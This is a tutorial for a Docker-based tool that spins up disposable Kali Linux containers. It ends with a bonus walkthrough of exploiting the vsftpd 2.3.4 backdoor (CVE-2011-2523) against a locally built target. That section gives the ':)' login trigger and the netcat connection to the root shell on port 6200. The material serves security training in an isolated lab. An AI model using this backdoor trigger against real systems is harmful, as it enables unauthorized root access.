# Tutorial: your first disposable lab session

This walks through the actual `lab` workflow as it exists today: get a
disposable Kali Linux shell up, watch it live in the TUI dashboard,
reconnect to it later, and tear it down without a trace. Then, as a bonus
section, you'll manually build and attack one of the bundled CVE labs to
see where this project is headed next.

## What you'll need

- Docker installed and running (`docker ps` should work without `sudo`) —
  see [INSTALLATION.md](INSTALLATION.md) if you haven't set this up yet.
- `lab` built and on your `PATH` — see [INSTALLATION.md](INSTALLATION.md)
  (there are no prebuilt binaries yet; it's a one-command `cargo install`).

Check both before continuing:

```bash
docker ps
lab --version
```

You should see an (possibly empty) container list and `lab 0.1.0`. If
either fails, stop here and fix that first.

## Step 1: Create your terminal

```bash
lab create
```

This pulls `kalilinux/kali-rolling` (first run only — it's cached after
that), starts it as a container named `docklab`, and drops you into an
interactive shell inside it. On first run it also installs a small
toolset for you automatically: `curl`, `wget`, `nmap`, `nano`, `git`,
`net-tools`, and `lynis`, and sets a `DockLAB` prompt so it's obvious
you're inside the container, not your host.

Try a couple of things to confirm you're really isolated:

```bash
whoami          # root — inside the container, not your host user
hostname        # a container ID, not your machine's hostname
ls /            # a fresh Kali filesystem, not your host's
```

Nothing you do from here — installing tools, cloning a repo, writing
files — touches your actual machine. It all lives in this container's
writable layer.

## Step 2: Do something with it

Install whatever you need and try it out. For example:

```bash
apt update && apt install -y python3
nmap -sV scanme.nmap.org   # a target Nmap's own project explicitly permits scanning
```

When you're done for now, leave the container:

```bash
exit
```

This stops the container — it does **not** delete it. Everything you
installed is still there, waiting.

## Step 3: Watch it live

In another terminal (the `docklab` container can be stopped or running —
`lab mon` works either way):

```bash
lab mon
```

You'll land on the **Overview** tab, showing the container's and image's
status. Use the number keys to switch tabs:

- `1` Overview — container/image status, running or not
- `2` Stats — live `docker stats` output (only meaningful while running)
- `3` Disk Usage — `docker system df -v`
- `4` Network — the container's network settings
- `5` Processes — `docker top`, the processes running inside it

Press `r` to force a refresh of the current tab, `h` or `?` for a help
overlay, `g` for a quick-start guide overlay, and `q` or `Esc` to quit (or
close an open overlay first).

## Step 4: Reconnect

Pick up where you left off:

```bash
lab reconnect
```

This runs `docker start -ai docklab` under the hood — you're back in the
same container, same installed tools, same files, as if you'd never left.

## Step 5: Clean up

When you're actually done with the lab, not just done for now:

```bash
lab close
```

This stops the container, force-removes it, and removes the
`kalilinux/kali-rolling` image. After this, nothing related to `docklab`
remains on your machine — `lab create` next time starts completely fresh.

## What you built

Four commands — `create`, `mon`, `reconnect`, `close` — covering the
entire lifecycle of a disposable terminal, with zero VM setup and zero
risk to your host filesystem (see
[SOLVING_REAL_WORLD_PROBLEMS.md](SOLVING_REAL_WORLD_PROBLEMS.md) for why
that specific guarantee — no bind-mounts, full teardown — is the part of
this project's design that's actually load-bearing today).

Add `-V` / `--verbose` to any command to see the exact `docker` commands
running underneath, e.g. `lab create -V`. Run `lab --help` for the full
flag/command reference, or `lab --guide` for a condensed version of this
workflow printed straight to your terminal.

---

## Bonus: manually run a bundled CVE lab

`docklab` ships three real, historical CVE labs under `labs/` — but
**there is no `lab catalog` or `lab start <cve-id>` command yet** to
launch them for you (that's the next major feature — see
[CONTRIBUTING.md](CONTRIBUTING.md#about-labs)). You can still run one
today, entirely by hand, using the attacker terminal from Step 1 as your
launch point. Here's the beginner lab, `CVE-2011-2523` (the vsftpd 2.3.4
backdoor), end to end.

### 1. Build and start the vulnerable target

From your host (not inside the `docklab` container):

```bash
docker build -t docklab-vsftpd-backdoor labs/CVE-2011-2523/docker
docker network create docklab-cve-demo
docker run -d --name vsftpd-target --network docklab-cve-demo docklab-vsftpd-backdoor
```

This builds `labs/CVE-2011-2523/docker/Dockerfile`, which packages a
small, self-contained script
(`labs/CVE-2011-2523/docker/vsftpd_2342_backdoor.py`) reproducing the
exact observable behavior of the real 2011 vsftpd backdoor, and starts it
on a private network of its own.

### 2. Put your attacker terminal on the same network

```bash
docker network connect docklab-cve-demo docklab
lab reconnect
```

### 3. Exploit it

Inside the attacker shell, connect to the target's FTP port and log in
with a username ending in the backdoor trigger, `:)`:

```bash
nc vsftpd-target 21
```

Once connected, type:

```
USER test:)
PASS anything
```

The login itself fails as expected (`530 Login incorrect.`) — but the
`:)` suffix silently spawned a root shell listener on port 6200 in the
background regardless. Press `Ctrl+C` to drop this connection, then
connect to that port:

```bash
nc vsftpd-target 6200
```

Type a command and press enter:

```bash
whoami
```

You should get `root` back — a full root shell on the target from a
single crafted FTP login. That's the entire vulnerability: no memory
corruption, no fuzzing, just a hardcoded backdoor trigger shipped in a
widely-distributed binary for three days in mid-2011.

### 4. Clean up

```bash
docker rm -f vsftpd-target
docker network rm docklab-cve-demo
lab close   # if you're also done with the attacker terminal itself
```

### Where to go from here

- Try the Intermediate lab, `labs/CVE-2014-6271` (Shellshock), and the
  Advanced one, `labs/CVE-2021-44228` (Log4Shell) — each `metadata.yaml`
  has a briefing and hints even without a `lab info` command to print
  them; just open the file.
- If you'd like to help turn this manual process into `lab catalog` /
  `lab start <cve-id>`, see
  [CONTRIBUTING.md](CONTRIBUTING.md#about-labs) — it's the single
  highest-value contribution this project can receive right now.
